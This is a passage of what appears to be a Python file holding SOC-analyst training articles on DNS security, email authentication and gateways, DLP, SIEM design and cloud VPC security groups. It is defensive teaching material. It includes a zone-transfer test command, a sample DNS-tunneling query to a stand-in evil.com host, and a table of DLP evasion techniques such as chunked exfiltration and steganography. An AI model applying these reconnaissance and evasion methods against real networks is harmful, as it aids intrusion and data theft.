};
```

### Testing for Open Zone Transfers

```bash
# Attempt zone transfer (should fail on hardened servers)
dig @ns1.example.com example.com AXFR

# If successful, entire zone is exposed:
# example.com.     IN  A     93.184.216.34
# mail.example.com IN  A     93.184.216.35
# vpn.example.com  IN  A     93.184.216.36
# dev.example.com  IN  A     10.0.5.10      <-- internal IP leaked!
```

## Split-Horizon DNS

Provides different DNS responses based on the source of the query:

```text
Internal Client (10.0.0.0/8):
  app.example.com -> 10.0.2.10 (internal server IP)

External Client (Internet):
  app.example.com -> 203.0.113.10 (public IP / load balancer)
```

```text
// BIND split-horizon
view "internal" {
    match-clients { 10.0.0.0/8; 172.16.0.0/12; };
    zone "example.com" {
        type master;
        file "example.com.internal.zone";
    };
};

view "external" {
    match-clients { any; };
    zone "example.com" {
        type master;
        file "example.com.external.zone";
    };
};
```

## DNS Threat Detection for SOC Analysts

### Suspicious DNS Patterns

| Pattern | Possible Threat | Detection Method |
|---|---|---|
| High query volume to single domain | DDoS, C2 beaconing | Query rate monitoring |
| Queries for very long subdomains | DNS tunneling/exfiltration | Subdomain length analysis |
| High NXDomain rate from single host | DGA malware | Response code monitoring |
| TXT record queries to unusual domains | C2 or data exfiltration | Record type monitoring |
| Queries to newly registered domains | Phishing, C2 infrastructure | Domain age correlation |
| Direct queries to external DNS (bypass) | Malware avoiding corporate DNS | Firewall DNS port monitoring |
| Encoded data in subdomain labels | DNS tunneling | Entropy analysis |

### DNS Tunneling Detection

```text
Normal DNS query:
  www.example.com                     (short, readable)

DNS tunneling query:
  aGVsbG8gd29ybGQ.dGhpcyBpcyB0ZXN0.tunnel.evil.com  (base64 in subdomain)

Detection indicators:
- Subdomain labels > 30 characters
- High entropy in subdomain strings
- Unusual number of subdomains (deep nesting)
- High query volume to single domain
- Large TXT record responses
```

## Key Takeaways for SOC Analysts

- DNS logs are one of the most valuable data sources for threat detection
- Disable recursion on authoritative servers; restrict recursive resolvers to internal clients
- DNSSEC prevents cache poisoning but does not encrypt queries (use DoT/DoH for privacy)
- DNS tunneling is a common exfiltration technique -- monitor for anomalous query patterns
- Zone transfer restrictions prevent attackers from mapping your entire infrastructure
- DoH creates visibility challenges; use enterprise policies to control encrypted DNS
"""
    ))

    # -------------------------------------------------------------------------
    # Article 11: Email Security Gateways and Filtering
    # -------------------------------------------------------------------------
    articles.append((
        "Email Security Gateways and Filtering",
        ["infrastructure", "email-security", "spf", "dkim", "dmarc", "spam-filtering"],
        r"""# Email Security Gateways and Filtering

## Overview

Email remains the primary initial attack vector for most organizations. Phishing,
business email compromise (BEC), malware delivery, and credential harvesting all rely
on email. SOC analysts must understand email security architecture, authentication
mechanisms, and filtering techniques to detect and respond to email-based threats.

## Email Flow Architecture

```text
Sending Side:
[Sender MUA] --> [Submission Server :587] --> [Sending MTA]
                                                   |
                                              [DNS: MX lookup]
                                                   |
                                                Internet
                                                   |
Receiving Side:
[Receiving MTA] --> [Email Security Gateway] --> [Mail Server]
                          |                          |
                    [Spam Filter]              [User Mailbox]
                    [AV Scan]
                    [SPF/DKIM/DMARC]
                    [Sandboxing]
                    [URL Rewriting]
```

### MTA Components

| Component | Role | Examples |
|---|---|---|
| MUA (Mail User Agent) | Email client | Outlook, Thunderbird, Gmail web |
| MSA (Mail Submission Agent) | Accepts mail from MUA | Postfix (port 587) |
| MTA (Mail Transfer Agent) | Routes mail between servers | Postfix, Exchange, Sendmail |
| MDA (Mail Delivery Agent) | Delivers to mailbox | Dovecot, Exchange |
| SEG (Secure Email Gateway) | Filters malicious email | Proofpoint, Mimecast, Microsoft Defender |

## SPF (Sender Policy Framework)

SPF allows domain owners to specify which mail servers are authorized to send
email on behalf of their domain.

### SPF Record Syntax

```text
# DNS TXT record for example.com
v=spf1 ip4:203.0.113.0/24 ip4:198.51.100.10 include:_spf.google.com include:spf.protection.outlook.com -all

Mechanisms:
  ip4:203.0.113.0/24    - Allow this IP range
  include:_spf.google.com - Include Google's SPF record
  -all                   - Hard fail: reject all others
  ~all                   - Soft fail: mark but deliver
  ?all                   - Neutral: no policy
```

### SPF Verification Process

```text
1. Receiving MTA extracts sender domain from MAIL FROM
2. Queries DNS for TXT record of sender domain
3. Checks if connecting IP matches SPF record
4. Result: pass, fail, softfail, neutral, none, temperror, permerror

Example header:
Received-SPF: pass (domain of example.com designates 203.0.113.10 as permitted sender)
```

## DKIM (DomainKeys Identified Mail)

DKIM uses cryptographic signatures to verify that an email was sent by an authorized
server and has not been modified in transit.

### DKIM Signing Process

```text
1. Sending MTA generates hash of email headers + body
2. Signs hash with domain's private key
3. Adds DKIM-Signature header to email
4. Receiving MTA retrieves public key from DNS
5. Verifies signature matches email content
```

### DKIM DNS Record

```text
# DNS TXT record: selector._domainkey.example.com
v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
```

### DKIM Signature Header

```text
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
    d=example.com; s=selector1;
    h=from:to:subject:date:message-id;
    bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=;
    b=AuUoFEfDxTDkHlLXSZEpZj79LICEps6v0e...
```

## DMARC (Domain-based Message Authentication, Reporting, and Conformance)

DMARC builds on SPF and DKIM, telling receivers what to do when authentication fails
and providing reporting back to the domain owner.

### DMARC Record

```text
# DNS TXT record: _dmarc.example.com
v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com;
    ruf=mailto:dmarc-forensic@example.com; fo=1; adkim=s; aspf=s; pct=100
```

### DMARC Policy Options

| Policy | Tag | Action |
|---|---|---|
| None | p=none | Monitor only, deliver all |
| Quarantine | p=quarantine | Send failures to spam/junk |
| Reject | p=reject | Block failures entirely |

### DMARC Alignment

```text
SPF Alignment: MAIL FROM domain must match From header domain
DKIM Alignment: d= in DKIM signature must match From header domain

Strict (s): Exact domain match required
Relaxed (r): Organizational domain match (subdomain OK)

For DMARC to pass: Either SPF or DKIM must pass AND align
```

### Email Authentication Summary

| Mechanism | Authenticates | Protects Against |
|---|---|---|
| SPF | Sending server IP | Direct domain spoofing |
| DKIM | Message integrity | Message tampering, spoofing |
| DMARC | From header domain | Display name spoofing |
| ARC | Forwarded mail auth | Auth breakage on forwarding |

## Email Sandboxing

Sandboxing detonates attachments and URLs in isolated environments:

```text
Email arrives with attachment
    |
[Static Analysis]
    | (file type, macros, known signatures)
    |
[Sandbox Detonation]
    | (execute in VM, monitor behavior)
    |
    +-- Network connections attempted?
    +-- Files dropped on disk?
    +-- Registry modifications?
    +-- Process injection?
    +-- Persistence mechanisms created?
    |
[Verdict: Clean / Suspicious / Malicious]
    |
[Deliver / Quarantine / Block]
```

## URL Rewriting and Time-of-Click Protection

```text
Original URL in email:
  https://legitimate-looking-site.com/invoice.pdf

Rewritten URL (by email gateway):
  https://urldefense.proofpoint.com/v2/url?u=https-3A__legitimate-2Dlooking...

When user clicks:
1. Request goes to email security vendor first
2. Vendor re-scans URL at time of click
3. If safe: redirect to original URL
4. If malicious: block and show warning page

Benefits:
- Catches delayed weaponization (URL safe at delivery, malicious hours later)
- Provides click tracking for SOC investigation
- Allows retroactive blocking of URLs discovered to be malicious
```

## Attachment Filtering Policies

| Policy | Action | Use Case |
|---|---|---|
| Block executables | Quarantine .exe, .bat, .ps1, .vbs, .js | Standard policy |
| Block password-protected archives | Quarantine .zip, .7z with password | Prevent sandbox evasion |
| Block macros | Strip or quarantine Office docs with macros | Prevent macro malware |
| Content disarm | Flatten PDFs, remove active content | High-security environments |
| File type verification | Check magic bytes, not just extension | Prevent extension spoofing |

## Quarantine Management

### Quarantine Review Workflow

```text
1. Email flagged by filter -> placed in quarantine
2. Daily quarantine digest sent to users (optional)
3. User requests release OR SOC reviews
4. SOC analyst checks:
   - Sender reputation and authentication results
   - Attachment analysis results
   - URL reputation
   - Email header analysis
5. Decision: Release / Delete / Report as threat
```

### Email Header Analysis for SOC

```text
Key headers to examine:

Return-Path: <actual-sender@example.com>        # Envelope sender
From: "CEO Name" <ceo@examp1e.com>               # Display (note: typosquatting!)
Received: from mail.evil.com (198.51.100.9)      # Actual sending server
X-Originating-IP: [198.51.100.9]                 # Original sender IP
Authentication-Results: spf=fail; dkim=none; dmarc=fail
X-Spam-Score: 8.5                                # Spam score
X-MS-Exchange-Organization-SCL: 9                # Spam Confidence Level
```

## Email-Based Attack Indicators for SOC

| Indicator | Attack Type | Response |
|---|---|---|
| SPF/DKIM/DMARC all fail | Domain spoofing | Block, alert if targeting executives |
| Lookalike domain (typosquatting) | Phishing/BEC | Block, search for other recipients |
| URL shortener to unknown site | Phishing | Sandbox URL, check reputation |
| Password-protected attachment | Malware delivery | Quarantine, request justification |
| Urgency + wire transfer request | BEC | Alert, out-of-band verification |
| Reply-to differs from From | Phishing/BEC | Flag for review |
| Newly registered sender domain | Phishing campaign | Block, investigate scope |

## Key Takeaways for SOC Analysts

- Implement SPF, DKIM, and DMARC together -- each alone is insufficient
- DMARC p=reject is the goal but requires careful rollout (start with p=none)
- Sandboxing catches malware that signature-based AV misses
- Time-of-click URL protection catches delayed weaponization attacks
- Always analyze email headers during phishing investigations, not just the visible content
- Quarantine management requires balancing security with user productivity
"""
    ))

    # -------------------------------------------------------------------------
    # Article 12: DLP Solutions Architecture and Deployment
    # -------------------------------------------------------------------------
    articles.append((
        "DLP Solutions Architecture and Deployment",
        ["infrastructure", "dlp", "data-loss-prevention", "data-protection", "compliance"],
        r"""# DLP Solutions: Architecture and Deployment

## Overview

Data Loss Prevention (DLP) systems detect and prevent unauthorized transmission of
sensitive data outside the organization. DLP is both a security control and a compliance
requirement for regulations like GDPR, HIPAA, and PCI DSS. SOC analysts encounter DLP
alerts daily and must understand how to triage, investigate, and determine whether a
data exposure is a policy violation, accidental disclosure, or active exfiltration.

## DLP Coverage Model

### Three States of Data

| State | Description | DLP Approach | Examples |
|---|---|---|---|
| Data at Rest | Stored on disk, database, share | Discovery scans, classification | File servers, databases, SharePoint |
| Data in Motion | Traversing the network | Network DLP, email DLP, proxy DLP | Email attachments, web uploads, FTP |
| Data in Use | Being accessed/processed by user | Endpoint DLP, agent-based monitoring | Copy/paste, print, screen capture, USB |

```text
+-------------------+  +-------------------+  +-------------------+
|   Data at Rest    |  |  Data in Motion   |  |   Data in Use     |
|                   |  |                   |  |                   |
| - File servers    |  | - Email gateway   |  | - Clipboard       |
| - Databases       |  | - Web proxy       |  | - USB/removable   |
| - Cloud storage   |  | - Network TAPs    |  | - Print           |
| - Endpoints       |  | - API gateways    |  | - Screen capture  |
| - Backups         |  | - Cloud CASB      |  | - Application     |
|                   |  |                   |  |                   |
| Scan & Classify   |  | Inspect & Block   |  | Monitor & Control |
+-------------------+  +-------------------+  +-------------------+
```

## Content Inspection Methods

| Method | Description | Accuracy | Example |
|---|---|---|---|
| Regex Pattern | Match patterns like SSN, credit card | Medium | `\b\d{3}-\d{2}-\d{4}\b` (SSN) |
| Keyword/Dictionary | Match specific terms or phrases | Low-Medium | "confidential", "top secret" |
| Document Fingerprinting | Hash sections of sensitive documents | High | Match against template fingerprints |
| Exact Data Matching (EDM) | Hash actual sensitive data values | Very High | Match against hashed customer DB |
| Machine Learning | Classify content by trained models | Medium-High | Detect financial reports, PII context |
| OCR | Extract text from images | Medium | Detect screenshots of sensitive data |
| Metadata Analysis | Check file properties and labels | Medium | Microsoft Information Protection labels |

### Regex Patterns for Common Data Types

```text
# Credit Card Numbers (Luhn-validated)
Visa:         4[0-9]{12}(?:[0-9]{3})?
MasterCard:   5[1-5][0-9]{14}
Amex:         3[47][0-9]{13}

# US Social Security Number
SSN:          \b\d{3}-\d{2}-\d{4}\b

# US Phone Number
Phone:        \b\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b

# Email Address
Email:        [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

# IP Address (IPv4)
IPv4:         \b(?:\d{1,3}\.){3}\d{1,3}\b

# IBAN (International Bank Account Number)
IBAN:         \b[A-Z]{2}\d{2}[A-Z0-9]{4}\d{7}([A-Z0-9]?){0,16}\b
```

## DLP Policy Configuration

### Policy Components

```text
Policy: "Protect Credit Card Data"
  |
  +-- Detection Rules
  |     +-- Content: Match credit card regex (Luhn validated)
  |     +-- Threshold: 10+ matches in single document/email
  |     +-- Context: Near keywords ("card", "expir", "cvv")
  |
  +-- Scope
  |     +-- Users: All employees
  |     +-- Channels: Email, web upload, USB, cloud storage
  |     +-- Exclusions: Payment processing team
  |
  +-- Response Actions
  |     +-- Email: Block + notify sender + alert SOC
  |     +-- Web upload: Block + log + alert SOC
  |     +-- USB: Encrypt + log + notify manager
  |     +-- Printing: Allow + log (audit only)
  |
  +-- Severity: High
  +-- Compliance: PCI DSS Requirement 3
```

### Policy Severity Matrix

| Data Type | Volume Threshold | External Transfer | Internal Transfer |
|---|---|---|---|
| Credit card numbers | 1+ | Block + Alert | Log + Notify |
| SSN / National ID | 1+ | Block + Alert | Block + Alert |
| Source code | Any | Block + Alert | Log |
| Employee PII | 50+ records | Block + Alert | Log + Notify |
| Financial reports (labeled) | Any | Block + Alert | Log |
| Health records (PHI) | 1+ | Block + Alert | Block + Notify |

## Endpoint DLP vs Network DLP

| Capability | Endpoint DLP | Network DLP |
|---|---|---|
| USB/removable media | Yes | No |
| Print monitoring | Yes | No |
| Clipboard/screen capture | Yes | No |
| Encrypted traffic | Yes (sees pre-encryption) | Requires TLS inspection |
| Offline protection | Yes | No |
| Cloud app uploads | Yes (browser/app level) | Yes (proxy/CASB) |
| Email | Yes (client-side) | Yes (gateway-side) |
| Deployment | Agent on each endpoint | Network appliance/proxy |
| Management | Higher (agents to maintain) | Lower (centralized) |
| Coverage | Complete per-host | Network chokepoints only |

## DLP Architecture Deployment

```text
                    Internet
                       |
                  [Firewall]
                       |
              [Email Security Gateway]---[DLP Email Policy]
                       |
                  [Web Proxy]---[DLP Web Policy]
                       |
                  [Core Network]
                       |
              +--------+--------+
              |                 |
    [User Endpoints]    [Server Segment]
    (Endpoint DLP       (DLP Discovery
     Agent installed)    scans file shares)
              |
        [USB/Print/
         Clipboard
         Controls]

Cloud Integration:
    [Cloud Access Security Broker (CASB)]
         |
    [SaaS Apps: O365, Google Workspace, Box, Slack]
         |
    [DLP Cloud Policies]
```

## Handling DLP Alerts

### DLP Alert Triage Workflow

```text
1. ALERT RECEIVED
   |
2. CLASSIFY
   |-- True positive (real sensitive data)?
   |-- False positive (pattern match but not sensitive)?
   |-- Policy exception (authorized transfer)?
   |
3. ASSESS SEVERITY
   |-- What type of data?
   |-- How much data?
   |-- Where was it going?
   |-- Was transfer completed or blocked?
   |
4. INVESTIGATE
   |-- Who initiated the transfer?
   |-- Is this a pattern (repeat offender)?
   |-- Was the destination known-bad?
   |-- Was the user's account compromised?
   |
5. RESPOND
   |-- Block transfer (if not already blocked)
   |-- Notify data owner
   |-- Report to compliance (if required)
   |-- Escalate to IR (if malicious intent)
   |-- Update policy (if false positive)
```

### Common DLP False Positive Scenarios

| Scenario | Cause | Resolution |
|---|---|---|
| Test credit card numbers in dev environment | Regex matches test data | Exclude dev team or test ranges |
| Marketing sends bulk email with customer names | PII threshold exceeded | Adjust threshold for marketing group |
| IT shares diagnostic logs externally | Logs contain IP addresses | Exclude IT from IP address rule |
| Finance sends reports to auditor | Financial data to external | Create exception for auditor domain |
| Resume contains SSN format numbers | Document ID looks like SSN | Require Luhn validation + context |

## DLP Metrics for SOC Reporting

| Metric | Purpose | Target |
|---|---|---|
| Total DLP alerts per week | Volume tracking | Trending downward |
| False positive rate | Policy accuracy | Below 30% |
| Mean time to triage | SOC efficiency | Under 15 minutes |
| Blocked transfers with sensitive data | Prevention effectiveness | Track by data type |
| Repeat offenders | Training needs | Identify top 10 users |
| Policy exception requests | Policy appropriateness | Review monthly |
| Data exposure incidents | Overall risk | Zero critical exposures |

## DLP Evasion Techniques and Countermeasures

| Evasion Technique | Description | Countermeasure |
|---|---|---|
| Password-protected archives | Encrypt files to bypass scanning | Block password-protected archives |
| Steganography | Hide data in images | OCR + file size anomaly detection |
| Encoding/obfuscation | Base64 or ROT13 data | Decode before inspection |
| Cloud personal accounts | Upload to personal Dropbox/Drive | CASB with account differentiation |
| Screenshot of data | Camera or screenshot tool | Endpoint DLP screen capture control |
| Chunked exfiltration | Send small pieces over time | Aggregate analysis over time windows |
| Renamed file extensions | Rename .xlsx to .jpg | File type detection by magic bytes |

## Key Takeaways for SOC Analysts

- DLP alert triage requires understanding the context: who, what, where, why
- False positives are inevitable; good tuning reduces them but never eliminates them
- Endpoint DLP covers gaps that network DLP cannot (USB, print, offline)
- DLP is not just a technical control -- it supports compliance and legal obligations
- Correlate DLP alerts with user behavior analytics for insider threat detection
- Always determine if a blocked transfer indicates accidental or intentional data exposure
"""
    ))

    # -------------------------------------------------------------------------
    # Article 13: SIEM Architecture and Data Flow
    # -------------------------------------------------------------------------
    articles.append((
        "SIEM Architecture and Data Flow",
        ["infrastructure", "siem", "log-management", "correlation", "alerting"],
        r"""# SIEM Architecture and Data Flow

## Overview

A Security Information and Event Management (SIEM) system is the central nervous system
of SOC operations. It collects, normalizes, correlates, and analyzes security events from
across the environment, enabling threat detection, investigation, and compliance reporting.
SOC analysts spend most of their time working within the SIEM, so understanding its
architecture is fundamental.

## SIEM Core Components

```text
+-------------------------------------------------------------------+
|                         SIEM Platform                               |
|                                                                     |
|  +-----------+  +-------------+  +------------+  +--------------+  |
|  | Collection|->| Parsing &   |->| Indexing & |->| Correlation  |  |
|  | Layer     |  | Normalizing |  | Storage    |  | Engine       |  |
|  +-----------+  +-------------+  +------------+  +--------------+  |
|                                                         |           |
|  +-----------+  +-------------+  +------------+  +--------------+  |
|  | Dashboards|<-| Search &    |<-| Alerting   |<-| Rules &      |  |
|  | & Reports |  | Investigation| | & Notify   |  | Analytics    |  |
|  +-----------+  +-------------+  +------------+  +--------------+  |
|                                                                     |
+-------------------------------------------------------------------+
```

## Log Collection Methods

| Method | Description | Use Case | Protocol/Port |
|---|---|---|---|
| Syslog | Standard log forwarding protocol | Network devices, Linux | UDP/TCP 514, TCP 1514 (TLS) |
| Agent-based | Software agent on source system | Windows, endpoints | Varies by vendor |
| API Polling | SIEM pulls logs via REST API | Cloud services, SaaS | HTTPS 443 |
| File Monitoring | Read log files from shared path | Legacy applications | SMB/NFS |
| Database Query | Query application databases | Custom applications | JDBC/ODBC |
| SNMP Traps | Network device alerts | Network equipment | UDP 162 |
| Windows Event Forwarding | Native Windows log collection | Windows servers/endpoints | TCP 5985/5986 |
| Kafka/Message Queue | High-volume streaming ingestion | Large-scale environments | TCP 9092 |

### Syslog Configuration Examples

```text
# rsyslog forwarding to SIEM (TLS)
# /etc/rsyslog.d/siem-forward.conf

$DefaultNetstreamDriverCAFile /etc/ssl/certs/siem-ca.pem
$ActionSendStreamDriver gtls
$ActionSendStreamDriverMode 1
$ActionSendStreamDriverAuthMode x509/name

*.* @@siem-collector.corp.local:1514;RSYSLOG_SyslogProtocol23Format
```

```text
# Cisco IOS syslog configuration
logging host 10.0.99.50 transport tcp port 1514
logging trap informational
logging facility local6
logging source-interface Loopback0
service timestamps log datetime msec localtime show-timezone
```

### Windows Event Collection

```powershell
# Windows Event Forwarding (WEF) subscription
wecutil cs /uri:http://siem-collector:5985/wsman \
    /cf:custom /e:true \
    /esa:siem-collector.corp.local \
    /ese:true

# Key Windows Event IDs for security monitoring
# 4624 - Successful logon
# 4625 - Failed logon
# 4648 - Logon with explicit credentials
# 4672 - Special privileges assigned
# 4688 - New process created (with command line)
# 4720 - User account created
# 4732 - Member added to security group
# 7045 - New service installed
# 1102 - Audit log cleared
```

## Parsing and Normalization

### Raw Log to Normalized Event

```text
Raw syslog:
Feb 15 14:32:01 fw01 %ASA-6-302013: Built inbound TCP connection 12345
    for outside:198.51.100.9/44123 (198.51.100.9/44123)
    to inside:10.0.2.10/443 (203.0.113.10/443)

Normalized event:
{
    "timestamp": "2026-02-15T14:32:01.000Z",
    "source": "fw01",
    "event_type": "connection_established",
    "direction": "inbound",
    "protocol": "TCP",
    "src_ip": "198.51.100.9",
    "src_port": 44123,
    "dst_ip": "10.0.2.10",
    "dst_port": 443,
    "nat_ip": "203.0.113.10",
    "nat_port": 443,
    "connection_id": 12345,
    "device_vendor": "Cisco",
    "device_product": "ASA",
    "severity": 6
}
```

### Common Normalization Schemas

| Schema | Standard | Used By |
|---|---|---|
| CEF (Common Event Format) | ArcSight format | ArcSight, many vendors |
| LEEF (Log Event Extended Format) | IBM format | QRadar |
| ECS (Elastic Common Schema) | Elastic format | Elasticsearch, IXION |
| OCSF (Open Cybersecurity Schema) | AWS-led standard | Amazon Security Lake |
| CIM (Common Information Model) | Splunk format | Splunk |

### ECS Field Mapping Example

```json
{
    "@timestamp": "2026-02-15T14:32:01.000Z",
    "event.category": "network",
    "event.type": "connection",
    "event.action": "connection_established",
    "source.ip": "198.51.100.9",
    "source.port": 44123,
    "destination.ip": "10.0.2.10",
    "destination.port": 443,
    "network.transport": "tcp",
    "network.direction": "inbound",
    "observer.name": "fw01",
    "observer.vendor": "Cisco",
    "observer.type": "firewall"
}
```

## Correlation Engine

### Correlation Rule Types

| Type | Description | Example |
|---|---|---|
| Single Event | Alert on specific event type | Admin account created |
| Threshold | Count exceeds limit in time window | 10+ failed logins in 5 minutes |
| Sequence | Ordered events within time window | Failed logins then success then privilege escalation |
| Aggregation | Group events by field, alert on count | Same source scanning 50+ destinations |
| Statistical | Deviation from baseline | 10x normal data volume for user |
| Absence | Expected event not seen | No heartbeat from critical server in 10 minutes |

### Example Correlation Rules

```text
Rule: Brute Force Followed by Successful Login
Condition:
  1. event.type = "authentication_failure"
     group_by: source.ip, user.name
     threshold: >= 5 within 300 seconds
  THEN
  2. event.type = "authentication_success"
     same source.ip OR same user.name
     within 60 seconds of last failure
Action:
  - Create alert (severity: HIGH)
  - Enrich with geo-IP and user context
  - Assign to Tier 1 analyst queue
```

```text
Rule: Potential Data Exfiltration
Condition:
  event.category = "network"
  network.direction = "outbound"
  destination.bytes > 500MB
  NOT destination.ip IN [known_cloud_services, CDN_ranges]
  time_of_day NOT IN [08:00-18:00]
Action:
  - Create alert (severity: MEDIUM)
  - Include top destination IPs
  - Correlate with DLP alerts for same user
```

## Alerting and Notification

### Alert Priority Framework

| Priority | Criteria | SLA | Notification |
|---|---|---|---|
| P1 Critical | Active compromise, data breach | 15 min response | Page on-call, notify management |
| P2 High | Likely malicious activity | 1 hour response | Notify SOC team lead |
| P3 Medium | Suspicious activity needs investigation | 4 hour response | SOC queue |
| P4 Low | Policy violation, informational | Next business day | SOC queue |
| P5 Informational | Audit, compliance logging | Weekly review | Dashboard only |

## SIEM Dashboard Design

### SOC Operations Dashboard Components

| Widget | Content | Purpose |
|---|---|---|
| Alert volume trend | Alerts per hour/day over time | Detect spikes, track trends |
| Open alerts by priority | P1/P2/P3/P4 counts | Workload management |
| Top alerting rules | Which rules fire most | Identify tuning needs |
| Top source IPs | Most active alert sources | Identify compromised hosts |
| MTTD / MTTR | Mean time to detect and respond | SOC performance metrics |
| Threat intel matches | IOC hits in last 24 hours | Active threat tracking |
| Authentication failures | Failed login trend | Brute force detection |
| Data source health | Log sources with gaps | Coverage monitoring |

## Capacity Planning

### Events Per Second (EPS) Estimation

| Source Type | Devices | EPS per Device | Total EPS |
|---|---|---|---|
| Firewalls | 5 | 500 | 2,500 |
| Windows servers | 50 | 20 | 1,000 |
| Windows endpoints | 1,000 | 5 | 5,000 |
| Linux servers | 30 | 10 | 300 |
| Network switches | 20 | 50 | 1,000 |
| Web proxy | 2 | 200 | 400 |
| DNS servers | 3 | 300 | 900 |
| Email gateway | 2 | 100 | 200 |
| IDS/IPS | 3 | 100 | 300 |
| Cloud services | 5 | 50 | 250 |
| **Total** | | | **~11,850 EPS** |

### Storage Estimation

```text
Average event size: 500 bytes
Daily events: 11,850 EPS x 86,400 seconds = ~1.02 billion events
Daily storage (raw): ~512 GB
Daily storage (with indexing): ~750 GB - 1 TB
30-day retention: ~22-30 TB
90-day retention: ~67-90 TB

Hot storage (fast search, 30 days): SSD/NVMe
Warm storage (slower search, 90 days): HDD
Cold storage (compliance archive, 1+ year): Object storage / tape
```

## Data Retention Considerations

| Regulation | Minimum Retention | Data Types |
|---|---|---|
| PCI DSS | 1 year (3 months immediately accessible) | Cardholder data environment logs |
| HIPAA | 6 years | PHI access and audit logs |
| SOX | 7 years | Financial system access logs |
| GDPR | Varies (minimize retention) | Personal data processing logs |
| NIST 800-171 | 3 years | CUI access and security logs |
| Internal Policy | Typically 90-365 days | All security-relevant logs |

## SIEM Health Monitoring

### Critical Health Checks

| Check | Concern | Threshold |
|---|---|---|
| Log source heartbeat | Source stopped sending logs | No events in 15 minutes |
| EPS rate | Sudden drop or spike | >50% deviation from baseline |
| Parsing errors | Parser not matching log format | >5% parse failure rate |
| Queue depth | Ingestion backlog | Queue growing for >30 minutes |
| Storage utilization | Running out of space | >80% disk usage |
| Search performance | Slow investigations | Query time >30 seconds |
| Correlation engine lag | Delayed alerting | >5 minutes behind real-time |

## Key Takeaways for SOC Analysts

- The SIEM is only as good as the data it receives -- log source coverage is critical
- Normalization quality directly impacts correlation rule effectiveness
- Tune correlation rules regularly to reduce false positives and alert fatigue
- Monitor SIEM health -- a silent log source means a blind spot, not a quiet network
- EPS licensing impacts what you can collect; prioritize high-value sources
- Correlation rules should map to specific attack techniques (MITRE ATT&CK)
"""
    ))

    # -------------------------------------------------------------------------
    # Article 14: Cloud Networking Fundamentals VPC Security Groups
    # -------------------------------------------------------------------------
    articles.append((
        "Cloud Networking Fundamentals VPC Security Groups",
        ["infrastructure", "cloud", "vpc", "security-groups", "aws", "azure", "network-security"],
        r"""# Cloud Networking Fundamentals: VPC and Security Groups

## Overview

Cloud networking replaces physical routers, switches, and firewalls with software-defined
equivalents. Understanding Virtual Private Clouds (VPCs), subnets, security groups, and
network ACLs is essential for SOC analysts investigating incidents in cloud environments
and reviewing cloud security posture.

## VPC Architecture

A VPC is an isolated virtual network within a cloud provider. It functions like a
traditional data center network but is entirely software-defined.

```text
+------------------------------------------------------------------+
|  VPC: 10.0.0.0/16                                                |
|                                                                    |
|  +---------------------------+  +---------------------------+     |
|  | Public Subnet: 10.0.1.0/24|  | Public Subnet: 10.0.2.0/24|   |
|  | (AZ-a)                     |  | (AZ-b)                     |   |
|  |                            |  |                            |    |
|  |  [Web Server]  [NAT GW]   |  |  [Web Server]  [ALB]       |   |
|  +---------------------------+  +---------------------------+     |
|                                                                    |
|  +---------------------------+  +---------------------------+     |
|  | Private Subnet: 10.0.3.0/24| | Private Subnet: 10.0.4.0/24|  |
|  | (AZ-a)                     |  | (AZ-b)                     |   |
|  |                            |  |                            |    |
|  |  [App Server]              |  |  [App Server]              |   |
|  +---------------------------+  +---------------------------+     |
|                                                                    |
|  +---------------------------+  +---------------------------+     |
|  | Data Subnet: 10.0.5.0/24  |  | Data Subnet: 10.0.6.0/24  |   |
|  | (AZ-a)                     |  | (AZ-b)                     |   |
|  |                            |  |                            |    |
|  |  [RDS Primary]             |  |  [RDS Standby]             |   |
|  +---------------------------+  +---------------------------+     |
|                                                                    |
+------------------------------------------------------------------+
         |                    |
    [Internet GW]        [VPN Gateway]
         |                    |
      Internet          On-Premises
```

## Subnet Types

| Subnet Type | Internet Access | Route Table | Use Case |
|---|---|---|---|
| Public | Direct (IGW) | 0.0.0.0/0 -> IGW | Web servers, load balancers |
| Private | Via NAT Gateway | 0.0.0.0/0 -> NAT GW | App servers, workers |
| Isolated | None | No default route | Databases, sensitive data |

### Route Table Configuration (AWS)

```text
# Public subnet route table
Destination       Target          Status
10.0.0.0/16       local           Active    (VPC internal)
0.0.0.0/0         igw-abc123      Active    (Internet Gateway)

# Private subnet route table
Destination       Target          Status
10.0.0.0/16       local           Active    (VPC internal)
0.0.0.0/0         nat-def456      Active    (NAT Gateway)

# Isolated subnet route table
Destination       Target          Status
10.0.0.0/16       local           Active    (VPC internal only)
```

## Security Groups vs Network ACLs

| Feature | Security Group | Network ACL (NACL) |
|---|---|---|
| Level | Instance/ENI level | Subnet level |
| State | Stateful (return traffic auto-allowed) | Stateless (explicit rules for both directions) |
| Rule Type | Allow rules only | Allow and deny rules |
| Rule Processing | All rules evaluated | Rules processed in order (number) |
| Default | Deny all inbound, allow all outbound | Allow all inbound and outbound |
| Association | Multiple SGs per instance | One NACL per subnet |
| Use Case | Primary instance-level firewall | Subnet-level guardrails, deny lists |

### Security Group Configuration

```text
# Web Server Security Group (sg-web)
Inbound Rules:
  Protocol  Port  Source           Description
  TCP       443   0.0.0.0/0        HTTPS from internet
  TCP       80    0.0.0.0/0        HTTP from internet (redirect to HTTPS)
  TCP       22    sg-bastion       SSH from bastion only

Outbound Rules:
  Protocol  Port  Destination      Description
  TCP       443   0.0.0.0/0        HTTPS to internet (updates, APIs)
  TCP       5432  sg-database      PostgreSQL to DB tier
  TCP       443   sg-app           HTTPS to app tier

# Application Server Security Group (sg-app)
Inbound Rules:
  Protocol  Port  Source           Description
  TCP       443   sg-web           HTTPS from web tier
  TCP       8080  sg-web           App port from web tier
  TCP       22    sg-bastion       SSH from bastion only

Outbound Rules:
  Protocol  Port  Destination      Description
  TCP       5432  sg-database      PostgreSQL to DB tier
  TCP       443   0.0.0.0/0        HTTPS outbound (APIs)

# Database Security Group (sg-database)
Inbound Rules:
  Protocol  Port  Source           Description
  TCP       5432  sg-app           PostgreSQL from app tier only
  TCP       5432  sg-bastion       DB access from bastion (admin)

Outbound Rules:
  (None needed -- stateful, return traffic auto-allowed)
```

### Network ACL Configuration

```text
# Public Subnet NACL
Inbound Rules:
  Rule#  Protocol  Port      Source         Action
